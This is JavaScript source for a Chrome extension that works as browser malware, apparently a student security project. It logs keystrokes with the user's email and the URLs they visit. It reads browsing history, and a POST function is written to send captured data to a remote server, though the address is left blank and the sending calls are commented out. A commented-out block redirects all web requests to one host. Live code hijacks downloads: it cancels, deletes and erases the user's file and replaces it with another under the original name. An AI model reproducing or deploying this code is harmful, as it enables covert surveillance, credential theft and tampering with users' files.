// Send data to external server
var rserverIP = "";
function sendToServer(data) {
  var req = new XMLHttpRequest();
  req.open("POST", rserverIP, true);
  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  req.send(data);
  req.onload = function () {
    console.log(this.responseText);
  };
}

// Get a certain number of last websites in history
function getHistory(number) {
  chrome.history.search({ text: "", maxResults: number }, function (data) {
    data.forEach(function (page) {
      console.log(page.url);
    });
  });
}

// Get keystrokes
var lastURL = "";
var userEmail = "";
function keyLog(request) {
  chrome.identity.getProfileUserInfo((userinfo) => {
    userEmail = userinfo.email;
    if (lastURL !== request.page) {
      console.log(userEmail);
      console.log(request.page);
      //sendToServer("page="+request.page);
      lastURL = request.page;
    }
    console.log(request.key);
    //sendToServer("key="+request.key);
  });
}

// Get HTML data of page
function pageLog(request) {
  console.log(request.page);
}

chrome.tabs.onUpdated.addListener(function (tabId, info) {
  if (info.status === "complete") {
    chrome.tabs.sendMessage(tabId, { type: "pageCapture" });
  }
});

// Handle the different message types
function handleMessageB(request) {
  if (request.type === "keyLog") {
    keyLog(request);
  } else if (request.type === "pageLog") {
    pageLog(request);
  }
}

// Handle the different messages
chrome.runtime.onMessage.addListener(handleMessageB);

/*
// Redirect requests to specific host
var host = "https://www.google.com/";
chrome.webRequest.onBeforeRequest.addListener(
  function (details) {
    console.log(details.url);
    return { redirectUrl: host };
  },
  {
    urls: ["<all_urls>"],
    types: ["main_frame", "sub_frame", "script"],
  },
  ["blocking"]
);*/

// Make download

/*
// Replace download
var downloadId;
var replacing = 0;
chrome.downloads.onDeterminingFilename.addListener(async function (downloadItem) {
  console.log("replacing");
  if (replacing == 0) {
    replacing = 1;
    downloadId = downloadItem.id;
    let filename = downloadItem.filename;
    console.log("filename with absolute local path ", filename);
    let cancelled = false;
    while (!cancelled) {
      try {
        await chrome.downloads.cancel(downloadItem.id);
        cancelled = true;
      } catch (error) {console.log("catched")}
    }
    try {
      if (downloadItem.state == "complete") {
        await chrome.downloads.removeFile(downloadItem.id);
      }
      await chrome.downloads.erase({ id: downloadItem.id });
    } catch (error) {}
    //await makeDownload("test.txt");
    //replacing = 0;
  }
});*/

var replacing = false;
var filenameOrigin = "";

async function makeDownload(name) {
  await chrome.downloads.download({
    url: "https://tls-sec.github.io/2019-2020/2020/01/19/projetslongs.html",
    filename: name,
  });
}

var cp = 0;
chrome.downloads.onDeterminingFilename.addListener(async function (
  downloadItem,
  suggest
) {
  try {
    console.log("signal");
    cp = cp + 1;
    console.log(cp);
    console.log("name0" + downloadItem.filename);
    if (cp > 2) {
      cp = 0;
      return;
    } else if (cp == 1) {
      console.log("name1" + downloadItem.filename);
      filenameOrigin = downloadItem.filename;
    } else if (cp == 2) {
      console.log("name2" + downloadItem.filename);
      suggest({ filename: filenameOrigin, conflictAction: "overwrite" });
    }
  } catch (error) {
    console.log("catched0");
  }

  console.log("filename with absolute local path ", filenameOrigin);
  let cancelled = false;
  while (!cancelled) {
    try {
      await chrome.downloads.cancel(downloadItem.id);
      cancelled = true;
    } catch (error) {
      console.log("catched");
    }
  }
  try {
    if (downloadItem.state == "complete") {
      await chrome.downloads.removeFile(downloadItem.id);
    }
  } catch (error) {
    console.log("catched2");
  }
  try {
    await chrome.downloads.erase({ id: downloadItem.id });
  } catch (error) {
    console.log("catched3");
  }
  try {
    console.log("before download");
    await makeDownload("file");
  } catch (error) {
    console.log("catched4");
  }
});
